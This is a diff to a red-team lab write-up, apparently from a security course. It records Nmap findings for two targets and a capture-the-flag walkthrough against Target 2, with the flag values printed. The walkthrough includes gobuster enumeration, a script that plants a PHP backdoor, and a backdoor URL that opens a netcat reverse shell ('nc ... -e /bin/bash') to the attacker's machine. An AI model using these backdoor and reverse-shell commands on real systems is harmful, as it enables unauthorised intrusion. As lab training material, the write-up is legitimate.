@@ -15,19 +15,35 @@ Nmap scan results for each machine reveal the below services and OS details:
 
 This scan identifies the services below as potential points of entry:
 - Target 1
-  - Port 22/TCP: OpenSSH
-  - Port 80/TCP: Apache web server
-  - Port 111/TCP: rpcbind
-  - Port 139/TCP: Samba smbd
-  - Port 445/TCP: Samba smbd
+  - Port 22/TCP: OpenSSH 6.7p1
+  - Port 80/TCP: Apache web server 2.4.10
+  - Port 111/TCP: rpcbind 2-4
+  - Port 139/TCP: Samba smbd 3-4
+  - Port 445/TCP: Samba smbd 3-4
 
-The following vulnerabilities were identified on each target:
+The following vulnerabilities were identified:
 - Target 1
   - Wordpress server is vulnerable to user enumeration
   - Wordpress and ssh server have weak passwords
   - MySQL password is stored in plain text
   - Wordpress hashes are stored unsalted
   - Steven user account has sudo permissions for Python
+
+`$ nmap -sV -O 192.168.1.115`
+
+![Initial Nmap Scan](Images/Target2Nmap.png "Nmap Scan")
+
+  This scan identifies the services below as potential points of entry:
+- Target 2
+  - Port 22/TCP: OpenSSH 6.7p1
+  - Port 80/TCP: Apache web server 2.4.10
+  - Port 111/TCP: rpcbind 2-4
+  - Port 139/TCP: Samba smbd 3-4
+  - Port 445/TCP: Samba smbd 3-4
+
+The following vulnerabilities were identified:
+- Target 2
+---------------------------------------------COMPLETE
 
 ### Exploitation
 
@@ -106,3 +122,32 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - ![Flag 4 Location](Images/flag4Location.png "Flag 4 Location")
       - `cat /root/flag4.txt`
       - ![Flag 4](Images/flag4.png "Flag 4")
+
+- Target 2
+    - `flag1`: flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
+    - **Exploit Used**
+      - We will use gobuster to enumerate the website
+        - `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://192.168.1.115/`
+        - ![Target 2 Gobuster Scan](Images/Target2Gobuster.png "Target 2 Gobuster Scan")
+        - After further inspecting the option we choose to check out the /vendor directory
+        - ![Target 2 Vendor Directory](Images/Target2Vendor.png "Target 2 Vendor Directory")
+        - Visiting the Path file shows the first flag
+        - ![Target 2 Flag 1](Images/Target2Flag1.png "Target 2 Flag 1")
+    - `flag2`: flag2{6a8ed560f0b5358ecf844108048eb337}
+    - **Exploit Used**
+      - We will exploit the insecure webserver and upload a backdoor to give us a bash shell on the target machine
+        - We take this [exploit.sh](exploit.sh) and run it to place a backdoor onto the target webserver
+      - Once the file is run we than start a netcat listener on the kali machine
+        - `nc -lnvp 4444`
+      - Than we use the backdoor file to connect the target computer to our kali machine by visiting this url
+        - `http://192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
+      - Now that we have a shell spawned on the target machine we will run a find command for the second flag
+        - `find / -iname '*flag*' -type -f`
+        - ![Target 2 Flag 2 and 3](Images/Target2Flag2.png "Target 2 Flag 2 and 3")
+        - This gives us the second flag and the location of the third flag
+    - `flag3`: flag3{a0f568aa9de277887f37730d71520d9b}
+    - **Exploit Used**
+      - From the find command used to locate the second command we know the location of the third flag as well
+        - ![Target 2 Flag 2 and 3](Images/Target2Flag2.png "Target 2 Flag 2 and 3")
+        - We can now visit http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png to see the third flag
+        - ![Target 2 Flag 3](Images/Target2Flag3.png "Target 2 Flag 3")
